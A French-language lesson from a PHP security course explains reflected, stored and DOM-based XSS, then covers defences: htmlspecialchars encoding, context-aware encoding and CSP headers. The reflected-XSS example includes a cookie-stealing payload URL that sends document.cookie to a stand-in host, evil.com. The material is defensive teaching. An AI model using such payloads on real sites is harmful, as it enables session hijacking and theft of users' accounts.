---
source_course: "php-security"
source_lesson: "php-security-xss-attacks"
---

# Cross-Site Scripting (XSS)

Le XSS permet aux attaquants **d'injecter des scripts malveillants** dans des pages web vues par d'autres utilisateurs.

## Types de XSS

### 1. XSS Réfléchi (Reflected)

Le script malveillant provient de la requête actuelle :

```php
<?php
// VULNÉRABLE
$search = $_GET['q'];
echo "Vous avez cherché : $search";

// URL d'attaque : search.php?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// La victime clique sur le lien, ses cookies sont volés
```

### 2. XSS Stocké (Stored)

Le script malveillant est stocké dans la base de données :

```php
<?php
// Le formulaire de commentaire sauvegarde dans la base de données
$comment = $_POST['comment'];  // Contient <script>...</script>
$pdo->prepare('INSERT INTO comments (text) VALUES (:text)');
$stmt->execute(['text' => $comment]);

// Plus tard, affiché aux autres utilisateurs
foreach ($comments as $comment) {
    echo "<p>$comment</p>";  // Le script s'exécute !
}
```

### 3. XSS Basé sur le DOM

Le script manipule le DOM directement :

```javascript
// Le JavaScript lit depuis l'URL et l'insère dans la page
document.getElementById("name").innerHTML = location.hash.slice(1);
// Attaque : page.html#<img src=x onerror=alert('XSS')>
```

## La Solution : Encodage de Sortie

```php
<?php
// TOUJOURS encoder la sortie
$userInput = '<script>alert("XSS")</script>';

// Contexte HTML
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
// Sortie : &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// Sûr - les navigateurs l'affichent comme du texte, ne l'exécutent pas
```

## Encodage Selon le Contexte

```php
<?php
// Contenu HTML
echo '<p>' . htmlspecialchars($text, ENT_QUOTES, 'UTF-8') . '</p>';

// Attribut HTML
echo '<input value="' . htmlspecialchars($value, ENT_QUOTES, 'UTF-8') . '">';

// Paramètre URL
echo '<a href="search.php?q=' . urlencode($query) . '">Rechercher</a>';

// Chaîne JavaScript (attention !)
echo '<script>var name = ' . json_encode($name) . ';</script>';

// CSS (éviter si possible)
// Ne jamais mettre des entrées utilisateur en CSS sans validation stricte
```

## Politique de Sécurité du Contenu (CSP)

```php
<?php
// Prévenir entièrement les scripts inline
header("Content-Security-Policy: script-src 'self'");

// Avec nonce pour des scripts inline spécifiques
$nonce = base64_encode(random_bytes(16));
header("Content-Security-Policy: script-src 'nonce-$nonce'");

// Dans le HTML :
echo "<script nonce=\"$nonce\">/* autorisé */</script>";
```

## Les Grimoires

- [Prévention XSS (Documentation Officielle)](https://www.php.net/manual/en/function.htmlspecialchars.php)

---

> 📘 _Cette leçon fait partie du cours [Ingénierie de Sécurité PHP](/php/php-security/) sur la plateforme d'apprentissage RostoDev._
